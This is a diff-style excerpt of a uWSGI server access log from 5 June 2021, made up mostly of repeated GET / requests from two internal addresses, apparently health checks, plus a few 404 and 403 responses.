+[pid: 3103|app: 0|req: 6/40] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:35:00 2021] GET / => generated 10457 bytes in 108 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 9/41] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:35:20 2021] GET / => generated 10457 bytes in 75 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 10/42] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:35:30 2021] GET / => generated 10457 bytes in 79 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 11/43] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:35:50 2021] GET / => generated 10457 bytes in 96 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 7/44] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:36:00 2021] GET / => generated 10457 bytes in 88 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 12/45] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:36:20 2021] GET / => generated 10457 bytes in 74 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 13/46] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:36:30 2021] GET / => generated 10457 bytes in 86 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 14/47] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:36:50 2021] GET / => generated 10457 bytes in 72 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 8/48] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:37:00 2021] GET / => generated 10457 bytes in 78 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 15/49] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:37:20 2021] GET / => generated 10457 bytes in 82 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 16/50] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:37:30 2021] GET / => generated 10457 bytes in 75 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 17/51] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:37:50 2021] GET / => generated 10457 bytes in 107 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 9/52] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:38:00 2021] GET / => generated 10457 bytes in 124 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 18/53] 10.0.0.90 () {46 vars in 820 bytes} [Sat Jun  5 19:38:05 2021] GET / => generated 10457 bytes in 133 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 10/54] 10.0.1.67 () {46 vars in 843 bytes} [Sat Jun  5 19:38:09 2021] GET /favicon.ico => generated 179 bytes in 66 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 3101|app: 0|req: 3/55] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:38:20 2021] GET / => generated 10457 bytes in 154 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 19/56] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:38:30 2021] GET / => generated 10457 bytes in 75 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 20/57] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:38:50 2021] GET / => generated 10457 bytes in 111 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 11/58] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:39:00 2021] GET / => generated 10457 bytes in 86 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 21/59] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:39:20 2021] GET / => generated 10457 bytes in 84 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 22/60] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:39:30 2021] GET / => generated 10457 bytes in 103 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 23/61] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:39:50 2021] GET / => generated 10457 bytes in 86 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 12/62] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:40:00 2021] GET / => generated 10457 bytes in 95 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 24/63] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:40:20 2021] GET / => generated 10457 bytes in 105 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 25/64] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:40:30 2021] GET / => generated 10457 bytes in 117 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 26/65] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:40:50 2021] GET / => generated 10457 bytes in 78 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 13/66] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:41:00 2021] GET / => generated 10457 bytes in 91 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 27/67] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:41:20 2021] GET / => generated 10457 bytes in 82 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 14/68] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:41:30 2021] GET / => generated 10457 bytes in 83 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 28/69] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:41:50 2021] GET / => generated 10457 bytes in 79 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 15/70] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:42:00 2021] GET / => generated 10457 bytes in 105 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 29/71] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:42:20 2021] GET / => generated 10457 bytes in 104 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 16/72] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:42:30 2021] GET / => generated 10457 bytes in 73 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 30/73] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:42:50 2021] GET / => generated 10457 bytes in 79 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 31/74] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:43:00 2021] GET / => generated 10457 bytes in 78 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 32/75] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:43:20 2021] GET / => generated 10457 bytes in 89 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 17/76] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:43:30 2021] GET / => generated 10457 bytes in 103 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 33/77] 10.0.0.90 () {46 vars in 781 bytes} [Sat Jun  5 19:43:44 2021] GET /ads.txt => generated 179 bytes in 57 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 18/78] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:43:50 2021] GET / => generated 10457 bytes in 85 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 34/79] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:44:00 2021] GET / => generated 10457 bytes in 123 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 35/80] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:44:21 2021] GET / => generated 10457 bytes in 102 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 19/81] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:44:30 2021] GET / => generated 10457 bytes in 75 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 36/82] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:44:51 2021] GET / => generated 10457 bytes in 106 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 20/83] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:45:00 2021] GET / => generated 10457 bytes in 108 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 37/84] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:45:21 2021] GET / => generated 10457 bytes in 101 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 21/85] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:45:30 2021] GET / => generated 10457 bytes in 82 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 38/86] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:45:51 2021] GET / => generated 10457 bytes in 98 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 22/87] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:46:00 2021] GET / => generated 10457 bytes in 92 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 39/88] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:46:21 2021] GET / => generated 10457 bytes in 121 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 23/89] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:46:30 2021] GET / => generated 10457 bytes in 91 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 40/90] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:46:51 2021] GET / => generated 10457 bytes in 107 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 24/91] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:47:00 2021] GET / => generated 10457 bytes in 72 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 41/92] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:47:21 2021] GET / => generated 10457 bytes in 103 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 25/93] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:47:31 2021] GET / => generated 10457 bytes in 123 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 42/94] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:47:51 2021] GET / => generated 10457 bytes in 99 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 26/95] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:48:01 2021] GET / => generated 10457 bytes in 75 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 43/96] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:48:21 2021] GET / => generated 10457 bytes in 74 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 27/97] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:48:31 2021] GET / => generated 10457 bytes in 105 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 44/98] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:48:51 2021] GET / => generated 10457 bytes in 81 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 45/99] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:49:01 2021] GET / => generated 10457 bytes in 109 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 46/100] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:49:21 2021] GET / => generated 10457 bytes in 107 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 28/101] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:49:31 2021] GET / => generated 10457 bytes in 88 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 47/102] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:49:51 2021] GET / => generated 10457 bytes in 78 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 29/103] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:50:01 2021] GET / => generated 10457 bytes in 81 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 48/104] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:50:21 2021] GET / => generated 10457 bytes in 104 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 49/105] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:50:31 2021] GET / => generated 10457 bytes in 90 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 50/106] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:50:51 2021] GET / => generated 10457 bytes in 86 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 51/107] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:51:01 2021] GET / => generated 10457 bytes in 72 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 52/108] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:51:21 2021] GET / => generated 10457 bytes in 83 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 30/109] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:51:31 2021] GET / => generated 10457 bytes in 123 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 53/110] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:51:51 2021] GET / => generated 10457 bytes in 109 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 31/111] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:52:01 2021] GET / => generated 10457 bytes in 113 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 54/112] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:52:21 2021] GET / => generated 10457 bytes in 119 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 32/113] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:52:31 2021] GET / => generated 10457 bytes in 81 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 55/114] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:52:51 2021] GET / => generated 10457 bytes in 108 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 33/115] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:53:01 2021] GET / => generated 10457 bytes in 107 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 56/116] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:53:21 2021] GET / => generated 10457 bytes in 83 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 34/117] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:53:31 2021] GET / => generated 10457 bytes in 107 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 57/118] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:53:51 2021] GET / => generated 10457 bytes in 89 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 35/119] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:54:01 2021] GET / => generated 10457 bytes in 80 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 58/120] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:54:21 2021] GET / => generated 10457 bytes in 106 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 36/121] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:54:31 2021] GET / => generated 10457 bytes in 99 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 59/122] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:54:51 2021] GET / => generated 10457 bytes in 81 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 37/123] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:55:01 2021] GET / => generated 10457 bytes in 94 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 60/124] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:55:21 2021] GET / => generated 10457 bytes in 74 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 38/125] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:55:31 2021] GET / => generated 10457 bytes in 109 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 61/126] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:55:51 2021] GET / => generated 10457 bytes in 77 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3103|app: 0|req: 39/127] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:56:01 2021] GET / => generated 10457 bytes in 82 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 62/128] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:56:21 2021] GET / => generated 10457 bytes in 72 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 63/129] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:56:31 2021] GET / => generated 10457 bytes in 83 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 64/130] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:56:51 2021] GET / => generated 10457 bytes in 104 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 65/131] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:57:01 2021] GET / => generated 10457 bytes in 80 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 66/132] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:57:21 2021] GET / => generated 10457 bytes in 77 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 67/133] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:57:31 2021] GET / => generated 10457 bytes in 86 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 68/134] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:57:51 2021] GET / => generated 10457 bytes in 111 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 69/135] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:58:01 2021] GET / => generated 10457 bytes in 107 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 70/136] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:58:21 2021] GET / => generated 10457 bytes in 87 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 71/137] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:58:31 2021] GET / => generated 10457 bytes in 93 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 72/138] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:58:51 2021] GET / => generated 10457 bytes in 88 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 73/139] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:59:01 2021] GET / => generated 10457 bytes in 96 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 74/140] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:59:21 2021] GET / => generated 10457 bytes in 93 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 75/141] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 19:59:31 2021] GET / => generated 10457 bytes in 85 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 76/142] 10.0.0.90 () {42 vars in 628 bytes} [Sat Jun  5 19:59:50 2021] GET / => generated 10457 bytes in 121 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 77/143] 10.0.0.90 () {42 vars in 650 bytes} [Sat Jun  5 19:59:51 2021] GET /phpmyadmin/ => generated 179 bytes in 52 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 78/144] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 19:59:51 2021] GET / => generated 10457 bytes in 96 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 79/145] 10.0.0.90 () {46 vars in 743 bytes} [Sat Jun  5 19:59:52 2021] POST / => generated 1529 bytes in 58 msecs (HTTP/1.1 403) 5 headers in 159 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 80/146] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:00:01 2021] GET / => generated 10457 bytes in 133 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 81/147] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:00:21 2021] GET / => generated 10457 bytes in 91 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 82/148] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:00:31 2021] GET / => generated 10457 bytes in 94 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 83/149] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:00:51 2021] GET / => generated 10457 bytes in 151 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 84/150] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:01:01 2021] GET / => generated 10457 bytes in 125 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 85/151] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:01:21 2021] GET / => generated 10457 bytes in 93 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 86/152] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:01:31 2021] GET / => generated 10457 bytes in 100 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 87/153] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:01:51 2021] GET / => generated 10457 bytes in 127 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 88/154] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:02:01 2021] GET / => generated 10457 bytes in 94 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 89/155] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:02:21 2021] GET / => generated 10457 bytes in 100 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 90/156] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:02:31 2021] GET / => generated 10457 bytes in 87 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 91/157] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:02:51 2021] GET / => generated 10457 bytes in 96 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 92/158] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:03:01 2021] GET / => generated 10457 bytes in 121 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 93/159] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:03:21 2021] GET / => generated 10457 bytes in 119 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 94/160] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:03:31 2021] GET / => generated 10457 bytes in 117 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 95/161] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:03:51 2021] GET / => generated 10457 bytes in 85 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 96/162] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:04:01 2021] GET / => generated 10457 bytes in 123 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 97/163] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:04:21 2021] GET / => generated 10457 bytes in 94 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 98/164] 10.0.0.90 () {34 vars in 394 bytes} [Sat Jun  5 20:04:31 2021] GET / => generated 10457 bytes in 92 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
+[pid: 3104|app: 0|req: 99/165] 10.0.1.67 () {34 vars in 394 bytes} [Sat Jun  5 20:04:51 2021] GET / => generated 10457 bytes in 128 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 0)
